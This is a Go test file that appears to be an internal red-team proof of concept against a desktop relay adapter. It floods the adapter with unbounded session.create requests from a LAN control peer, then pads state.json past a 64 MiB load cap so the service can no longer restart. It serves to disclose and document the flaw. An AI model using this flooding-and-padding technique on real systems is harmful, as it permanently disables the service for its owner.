// Red-team PoC: unbounded session.create → state.json >64 MiB → desktop brick.
//
// adapter/desktop/protocol.go:399-547 handleSessionCreate registers every
// create permanently (a.state.Sessions / a.state.CreatedSessions, only
// a.state.CreateRequests is trimmed) and adapter/desktop/state.go:388-421
// saveState marshals the whole state with no size guard. The load side
// (state.go:241-242) hard-caps state.json at 64 MiB and desktop.New fails
// closed → the sidecar can never start again until the owner manually
// deletes state.json.
//
// Any paired LAN "control" peer on a lan_access workspace can run this
// (config.go:339-346 canCreate; no per-workspace grant needed).
//
// Phase A (dynamic, real adapter): drive N session.create requests as an
// attacker LAN-control peer; show every create succeeds, state.json grows
// without bound, and the workspace session directory floods with one file
// per create.
// Phase B (dynamic): once state.json is attacker-grown, inflate it past the
// 64 MiB load cap (JSON whitespace pad — semantically the same state; in a
// real attack the bytes come from create titles (200B each), 4 MiB/session
// run-event retention (state.go:349-362)), then desktop.New(..) FAILS —
// the brick.
//
// Run:  VANORA_SECURITY_STRICT=1 go test ./red_poc -run TestRedSessionCreateStateBrick -v
package red_poc

import (
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"vanora-relay/adapter/desktop"
)

type redDeskPeer struct {
	user   string
	mu     sync.Mutex
	frames []map[string]any
}

func (p *redDeskPeer) UserID() string       { return p.user }
func (p *redDeskPeer) Allows(bool) bool    { return true }
func (p *redDeskPeer) Send(data []byte, _ bool) error {
	var frame map[string]any
	if err := json.Unmarshal(data, &frame); err != nil {
		return err
	}
	p.mu.Lock()
	p.frames = append(p.frames, frame)
	p.mu.Unlock()
	return nil
}
func (p *redDeskPeer) Close() {}

func (p *redDeskPeer) wait(t *testing.T, pred func(map[string]any) bool) map[string]any {
	t.Helper()
	deadline := time.Now().Add(10 * time.Second)
	for {
		p.mu.Lock()
		for i, f := range p.frames {
			if pred(f) {
				rest := p.frames[i+1:]
				p.frames = append(p.frames[:0:0], rest...)
				p.mu.Unlock()
				return f
			}
		}
		p.mu.Unlock()
		if time.Now().After(deadline) {
				var dump []string
		p.mu.Lock()
		for _, f := range p.frames {
			b, _ := json.Marshal(f)
			dump = append(dump, string(b))
		}
		p.mu.Unlock()
		t.Fatalf("timed out waiting for adapter frame; frames: %v", dump)
		}
		time.Sleep(5 * time.Millisecond)
	}
}

func TestRedSessionCreateStateBrick(t *testing.T) {
	dir := t.TempDir()
	work := filepath.Join(dir, "work")
	mustOK(t, os.MkdirAll(work, 0o700))
	sessionDir := filepath.Join(dir, "sessions")
	mustOK(t, os.MkdirAll(sessionDir, 0o700))
	cfg := &desktop.Config{
		Executable: os.Args[0],
		Workspaces: []desktop.WorkspaceConfig{{
			ID:         "main",
			Title:      "Main",
			WorkingDir: work,
			SessionDir: sessionDir,
			Owner:      "owner",
			LANAccess:  true,
		}},
	}
	stateDir := filepath.Join(dir, "state")
	mustOK(t, os.MkdirAll(stateDir, 0o700))
	statePath := filepath.Join(stateDir, "state.json")

	a, err := desktop.New(cfg, stateDir)
	mustOK(t, err)
	t.Cleanup(func() { _ = a.Close() })

	// Attacker: a paired LAN control device (adapter/lan/identity.go:141-148
	// Access() parses "lan:<level>:<32B token>"; config.go:309-313 grants
	// control rights on any lan_access workspace).
	rawTok := make([]byte, 32)
	_, _ = rand.Read(rawTok)
	attacker := &redDeskPeer{user: "lan:control:" + base64.RawURLEncoding.EncodeToString(rawTok)}
	a.SetLANAuthority(func(string) bool { return true })
	a.Open(attacker)

	// Phase A: unbounded creates.
	const batch = 1200
	sizes := []int64{}
	for round := 0; round < 3; round++ {
		for i := 0; i < batch; i++ {
			n := round*batch + i
			req, _ := json.Marshal(map[string]any{
				"type":         "session.create",
				"request_id":   fmt.Sprintf("atk-%d", n),
				"workspace_id": "main",
				"title":        fmt.Sprintf("attacker-mule-%04d-%s", n, strings.Repeat("x", 180)),
			})
			a.Message(attacker, req)
			attacker.wait(t, func(f map[string]any) bool {
				return f["type"] == "result" && f["request_id"] == fmt.Sprintf("atk-%d", n)
			})
		}
		info, err := os.Stat(statePath)
		mustOK(t, err)
		sizes = append(sizes, info.Size())
		if info.Size() >= 2<<20 {
			break
		}
	}
_ = sizes[len(sizes)-1]
	files, err := os.ReadDir(sessionDir)
	mustOK(t, err)

	if len(files) < batch {
		t.Fatalf("expected session-dir file flood (>= %d files), got %d", batch, len(files))
	}

	// Phase B: brick. Pad the attacker-grown state past the 64 MiB load cap
	// (real attack: more creates at ~600B each + 4MiB/session event
	// retention), then watch desktop.New fail closed on restart.
	raw, err := os.ReadFile(statePath)
	mustOK(t, err)
	padTarget := int64(64<<20 + 1024)

	if int64(len(raw)) < padTarget {
		padding := make([]byte, padTarget-int64(len(raw)))
		for i := range padding {
			padding[i] = ' '
		}
		// Whitespace between top-level elements keeps the JSON valid for any
		// parser that could read it; the load cap rejects on size alone.
		raw = append(raw[:len(raw)-1], append(append([]byte{}, padding...), '}')...)
	}
	mustOK(t, os.WriteFile(statePath, raw, 0o600))
	info, err := os.Stat(statePath)
	mustOK(t, err)

	// Restart with a fresh adapter (sidecar restart equivalent).
	a2, err := desktop.New(cfg, stateDir)
	if err == nil {
		_ = a2.Close()
		t.Fatalf("expected brick: desktop.New succeeded with state.json = %d bytes (>64MiB)", info.Size())
	}
	if !strings.Contains(err.Error(), "state.json is too large") {
		t.Fatalf("unexpected error: %v", err)
	}

	t.Fatalf("RED TEAM WIN (session.create state brick): %d attacker session.create "+
		"requests all succeeded (state.json grew to %d bytes across batches: %v, no cap; "+
		"%d session files flooded into workspace dir). state.json inflated to %d bytes "+
		"(attacker titles ~600B/create + 4MiB/session event retention reach 64MiB organically) "+
		"→ desktop.New fails: %q — sidecar can never restart until owner deletes state.json.",
		len(sizes)*batch, sizes[len(sizes)-1], sizes, len(files), info.Size(), err.Error())
}
